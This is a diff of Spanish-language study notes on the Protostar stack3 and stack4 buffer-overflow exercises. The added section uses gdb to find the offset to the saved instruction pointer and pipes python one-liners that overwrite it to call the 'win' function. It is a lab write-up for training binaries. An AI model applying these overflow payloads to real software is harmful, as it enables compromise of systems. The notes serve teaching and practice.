@@ -106,7 +106,7 @@ you have correctly got the variable to the right value
 ```
 
 ---------------------------------------------------------------------------
-# Sobreescribir un puntero de insutrcción -> [stack3](https://exploit.education/protostar/stack-one/)
+# Sobreescribir un puntero de instrucción -> [stack3](https://exploit.education/protostar/stack-one/)
 
 Aquí tenemos que modificar el registro "eip" el cual contiene la dirección de la siguiente insutrucción que el programa va a ejecutar. 
 Hay que mandarlo en concreto a la funcion "win"
@@ -148,6 +148,7 @@ Segmentation fault
 0x41414141:	Cannot access memory at address 0x41414141
 ```
 En vez de meterle "AAAA" al eip hay que meterle la direccion de una función real, en concreto la de "win" que es: 08048424 o "\x24\x84\x04\x08"
+
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + '\x24\x84\x04\x08')" | ./stack3
 calling function pointer, jumping to 0x08048424
@@ -166,3 +167,51 @@ print payload
 calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
+---------------------------------------------------------------------------
+
+# Sobreescribir un puntero de instrucción 2 -> [stack4](https://exploit.education/protostar/stack-four/)
+
+La teoría es la misma que con el caso anterior, solo que este es algo mas realista ya que el eip no esta pegado al final del buffer.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack4
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76)" | ./stack4
+Segmentation fault
+```
+Para ver lo que está pasando, vamos a hacer un patrón reconocible y pasarlo por gdb.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'BBBBCCCCDDDDEEEEFFFFGGGG')" > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack4
+(gdb) b *0x0804841d -> Ponemos el breakpoint en la instrucción "leave"
+(gdb) run < /tmp/pattern
+Breakpoint alcazado!
+(gdb) x/40wx $esp
+0xbffff650:	0xbffff660	0xb7ec6165	0xbffff668	0xb7eada75
+0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6a0:	0x42424242	0x43434343	0x44444444	0x45454545
+0xbffff6b0:	0x46464646	0x47474747	0xbffff700	0xb7fe1848
+Program received signal SIGSEGV, Segmentation fault.
+0x45454545 in ?? ()
+(gdb) p 0xbffff6ac - 0xbffff660
+$1 = 76 -> Justo donde antes nos daba SEGFAULT
+```
+Ahora la instrucción win es 0x080483f4 o "\xf4\x83\x04\x08"
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76 + '\xf4\x83\x04\x08')" | ./stack4
+code flow successfully changed
+Segmentation fault -> Aunque se queje nos ha ejecutado la win (el mensaje de antes)
+```
+```console
+(gdb) disas win
+0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
+0x08048401 <win+13>:	call   0x804832c <puts@plt>
+...
+(gdb) x/s 0x80484e0
+0x80484e0:	 "code flow successfully changed"
+```
+---------------------------------------------------------------------------
